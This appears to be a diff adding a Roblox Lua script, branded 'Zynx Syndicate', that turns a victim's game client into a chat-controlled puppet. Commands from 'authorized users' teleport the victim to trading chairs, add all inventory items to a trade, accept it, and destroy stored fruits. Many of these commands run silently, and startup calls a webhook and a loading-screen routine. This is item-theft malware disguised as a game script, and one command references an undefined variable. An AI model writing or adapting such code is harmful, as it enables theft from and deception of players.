+    local cafePosition = CFrame.new(-380, 85, 270)
+    
+    -- Calculate distance and time (250 speed)
+    local distance = (hrp.Position - cafePosition.Position).Magnitude
+    local travelTime = distance / 250
+    
+    local tweenInfo = TweenInfo.new(
+        travelTime,
+        Enum.EasingStyle.Linear,
+        Enum.EasingDirection.Out,
+        0,
+        false,
+        0
+    )
+    
+    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = cafePosition})
+    
+    local success = pcall(function()
+        tween:Play()
+        wait(travelTime)
+        if teleporting then
+            hrp.CFrame = cafePosition
+        end
+    end)
+    
+    teleporting = false
+    return success
+end
+
+local function stopTeleport()
+    teleporting = false
+end
+
+-- ===== TELEPORT FUNCTIONS =====
+local function manualTeleportToCafe()
+    local currentSea = GetTradingSea()
+    if currentSea ~= 2 then
+        return false, "You need to be in 2nd Sea to teleport to Cafe!"
+    end
+    
+    local success = smoothTeleportToCafe()
+    
+    if success then
+        return true, "✅ Teleporting to cafe"
+    else
+        return false, "❌ Teleport failed"
+    end
+end
+
+-- ===== INVENTORY FUNCTIONS =====
+local function getInventory()
+    local success, inventory = pcall(function()
+        return Remote:InvokeServer("getInventory")
+    end)
+    return success and inventory or {}
+end
+
+local function findExactFruitName(searchName)
+    local inventory = getInventory()
+    searchName = searchName:lower()
+    for _, item in pairs(inventory) do
+        if item and item.Name and item.Name:lower():find(searchName) then
+            return item.Name
+        end
+    end
+    return nil
+end
+
+local function getAllMatchingFruits(searchName)
+    local inventory = getInventory()
+    local fruits = {}
+    searchName = searchName:lower()
+    
+    for _, item in pairs(inventory) do
+        if item and item.Name and item.Name:lower():find(searchName) then
+            table.insert(fruits, item.Name)
+        end
+    end
+    return fruits
+end
+
+-- ===== UPDATED WORKING TRADE FUNCTIONS =====
+local function addFruitToTrade(fruitName)
+    local exactName = findExactFruitName(fruitName)
+    if not exactName then return false end
+    
+    local success = pcall(function()
+        return TradeFunction:InvokeServer("addItem", exactName)
+    end)
+    
+    return success
+end
+
+local function unstoreFruit(fruitName)
+    local exactName = findExactFruitName(fruitName)
+    if not exactName then return false end
+    
+    local success = pcall(function()
+        return Remote:InvokeServer("LoadFruit", exactName)
+    end)
+    
+    return success
+end
+
+local function acceptTrade()
+    local success = pcall(function()
+        return TradeFunction:InvokeServer("accept")
+    end)
+    
+    return success
+end
+
+-- ===== ALL COMMANDS =====
+local commands = {
+    -- Character Commands
+    reset = function()
+        stopTeleport()
+        if LocalPlayer.Character then
+            LocalPlayer.Character:BreakJoints()
+        end
+        return nil -- Silent
+    end,
+    
+    jump = function()
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.Jump = true
+        end
+        return nil -- Silent
+    end,
+    
+    kick = function(reason)
+        reason = reason or "No reason provided"
+        LocalPlayer:Kick("Zynx: " .. reason)
+        return "👋 Kicking with reason: " .. reason
+    end,
+    
+    -- Teleport Commands
+    tp = function()
+        stopTeleport()
+        local success, message = manualTeleportToCafe()
+        if success then
+            return "✅ Teleporting to cafe"
+        else
+            return message
+        end
+    end,
+    
+    -- 3rd Sea Portal Commands
+    portal = function(...)
+        local args = {...}
+        if #args == 0 then 
+            return "❌ Please specify portal: !portal [mansion/hydra/castle/tiki]"
+        end
+        
+        -- Combine all arguments to handle multi-word portal names
+        local portalName = table.concat(args, " ")
+        
+        local success, message = useThirdSeaPortal(portalName)
+        if success then
+            return message
+        else
+            return message
+        end
+    end,
+    
+    -- Trading Chair Commands
+    sit = function()
+        stopTeleport()
+        if not LocalPlayer.Character then
+            return "❌ No character found"
+        end
+        
+        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+        
+        if not hrp or not humanoid then
+            return "❌ Character not ready"
+        end
+        
+        local currentSea = GetTradingSea()
+        
+        if currentSea == 1 then
+            return "❌ You need to be in 2nd or 3rd Sea for trading"
+        end
+        
+        local availableChairs = findAvailableChair()
+        
+        if #availableChairs == 0 then
+            return "❌ No available trading chairs"
+        end
+        
+        local targetChair = availableChairs[1].chair
+        
+        hrp.CFrame = CFrame.new(targetChair.position)
+        wait(0.3)
+        humanoid.Sit = true
+        
+        return "✅ Okay"
+    end,
+    
+    status = function()
+        local currentSea = GetTradingSea()
+        local occupiedCount = 0
+        local totalChairs = 0
+        
+        for _, chair in pairs(tradingChairs) do
+            if chair.sea == currentSea then
+                totalChairs = totalChairs + 1
+                if isChairOccupied(chair.position) then
+                    occupiedCount = occupiedCount + 1
+                end
+            end
+        end
+        
+        return "🪑 " .. occupiedCount .. "/" .. totalChairs .. " chairs occupied"
+    end,
+    
+    chairs = function()
+        local availableChairs = findAvailableChair()
+        
+        if #availableChairs > 0 then
+            return "✅ " .. #availableChairs .. " chairs available - use !sit"
+        else
+            return "❌ No available chairs"
+        end
+    end,
+    
+    sea = function(seaNumber)
+        if not seaNumber then
+            local currentSea = GetTradingSea()
+            local seaName = currentSea == 2 and "Cafe (2nd Sea)" or currentSea == 3 and "Turtle Island (3rd Sea)" or "First Sea"
+            return "🌊 You are in " .. seaName
+        end
+        
+        seaNumber = tonumber(seaNumber)
+        if seaNumber and seaNumber >= 1 and seaNumber <= 3 then
+            manualSeaOverride = seaNumber
+            if seaNumber == 2 then
+                return "✅ Sea 2 selected"
+            elseif seaNumber == 3 then
+                return "✅ Sea 3 selected"
+            else
+                return "✅ Sea 1 selected"
+            end
+        else
+            return "❌ Invalid sea number. Use: !sea 1, !sea 2, or !sea 3"
+        end
+    end,
+    
+    autosea = function()
+        manualSeaOverride = nil
+        local currentSea = GetTradingSea()
+        local seaName = currentSea == 2 and "Cafe (2nd Sea)" or currentSea == 3 and "Turtle Island (3rd Sea)" or "First Sea"
+        return "🤖 Auto sea detection enabled - Current: " .. seaName
+    end,
+    
+    debugsea = function()
+        local currentSea = GetTradingSea()
+        local seaName = currentSea == 2 and "Cafe" or currentSea == 3 and "Turtle Island" or "First Sea"
+        local nearbyChairs = findChairsInCurrentSea()
+        
+        local debugInfo = "🔍 Sea Debug:\n"
+        debugInfo = debugInfo .. "📍 " .. seaName .. " (Sea " .. currentSea .. ")\n"
+        debugInfo = debugInfo .. "🪑 Nearby chairs: " .. #nearbyChairs
+        
+        return debugInfo
+    end,
+    
+    -- ===== FIXED ADD FRUIT COMMAND (SILENT VERSION) =====
+    addfruit = function(...)
+        local args = {...}
+        if #args == 0 then return "❌ Please specify fruit name: !addfruit [name]" end
+        
+        -- Combine all arguments to handle spaces in skin names
+        local itemName = table.concat(args, " ")
+        
+        -- Execute the function but don't return any message
+        addFruitToTradeImproved(itemName)
+        
+        -- Always return nil to prevent chat messages
+        return nil
+    end,
+    
+    -- ===== FIXED RESETFRUIT COMMAND (SILENT VERSION) =====
+    resetfruit = function(fruitName)
+        if not fruitName then return nil end -- Silent return
+        
+        -- Step 1: Unstore the fruit (move to inventory)
+        local exactName = findExactFruitName(fruitName)
+        if not exactName then
+            return nil -- Silent return
+        end
+        
+        -- Format the fruit name correctly for the remote
+        local formattedName = formatItemName(exactName)
+        
+        local unstoreSuccess = pcall(function()
+            return Remote:InvokeServer("LoadFruit", formattedName)
+        end)
+        
+        -- Step 2: Reset character after 1 second
+        wait(1)
+        if LocalPlayer.Character then
+            LocalPlayer.Character:BreakJoints()
+        end
+        
+        return nil -- Always return nil to prevent chat messages
+    end,
+    
+    accept = function()
+        local success = acceptTrade()
+        if success then
+            return "✅ Trade accepted!"
+        else
+            return "❌ Failed to accept trade"
+        end
+    end,
+    
+    findfruit = function(fruitName)
+        if not fruitName then return "❌ Please specify fruit name: !findfruit [name]" end
+        
+        local found = getAllMatchingFruits(fruitName)
+        
+        if #found > 0 then
+            return "🔍 Found: " .. table.concat(fruits, ", ")
+        else
+            return "❌ No " .. fruitName .. " found"
+        end
+    end,
+    
+    addallitems = function()
+        local inventory = getInventory()
+        local permItems = {}
+        
+        for _, item in pairs(inventory) do
+            if item and item.Name then
+                table.insert(permItems, item.Name)
+            end
+        end
+        
+        if #permItems == 0 then
+            return "❌ I don't have any perm fruit"
+        end
+        
+        local count = 0
+        for _, itemName in pairs(permItems) do
+            local success = pcall(function()
+                return TradeFunction:InvokeServer("addItem", itemName)
+            end)
+            if success then
+                count = count + 1
+            end
+            wait(0.1)
+        end
+        
+        return "✅ Added " .. count .. " perm items to trade"
+    end,
+    
+    demolish = function()
+        local inventory = getInventory()
+        local count = 0
+        
+        for _, item in pairs(inventory) do
+            if item and item.Name then
+                local success = pcall(function()
+                    return Remote:InvokeServer("LoadFruit", item.Name)
+                end)
+                if success then
+                    count = count + 1
+                end
+                wait(0.2)
+            end
+        end
+        
+        if LocalPlayer.Character then
+            LocalPlayer.Character:BreakJoints()
+        end
+        
+        return "💣 Attempted to demolish " .. count .. " fruits & reset!"
+    end
+}
+
+-- ===== CHAT SETUP =====
+local function setupTradingCommands()
+    if TextChatService and TextChatService.TextChannels then
+        local channel = TextChatService.TextChannels.RBXGeneral
+        if channel then
+            channel.OnIncomingMessage = function(message)
+                local speaker = Players:FindFirstChild(message.TextSource.Name)
+                if speaker then
+                    local isAuthorized, userType = isTradingUserAuthorized(speaker)
+                    
+                    if isAuthorized then
+                        local text = message.Text
+                        
+                        if text:sub(1, 1) == commandPrefix then
+                            local args = {}
+                            for arg in text:sub(2):gmatch("%S+") do
+                                table.insert(args, arg)
+                            end
+                            
+                            local command = args[1] and args[1]:lower() or ""
+                            table.remove(args, 1)
+                            
+                            if commands[command] then
+                                local result = commands[command](table.unpack(args))
+                                -- Only send message if result is not nil (for cooldown/silent commands)
+                                if result then
+                                    TextChatService.TextChannels.RBXGeneral:SendAsync(result)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    print("✅ Trading commands system loaded")
+end
+
+-- ===== MAIN EXECUTION =====
+print("🚀 Starting Zynx Syndicate Complete Script...")
+
+-- Start webhook system
+SendWebhook()
+
+-- Start loading screen system
+startLoadingSequence()
+
+-- Start trading commands (after loading completes or authorized user joins)
+spawn(function()
+    while not loadingComplete do
+        wait(1)
+    end
+    setupTradingCommands()
+end)
+
+-- Alternative: Start trading commands if authorized user joins
+spawn(function()
+    while true do
+        if authorizedUserJoined then
+            wait(5) -- Wait a bit after authorized user detection
+            setupTradingCommands()
+            break
+        end
+        wait(1)
+    end
+end)
+
+print("✅ All systems initialized - Monitoring for authorized users...")
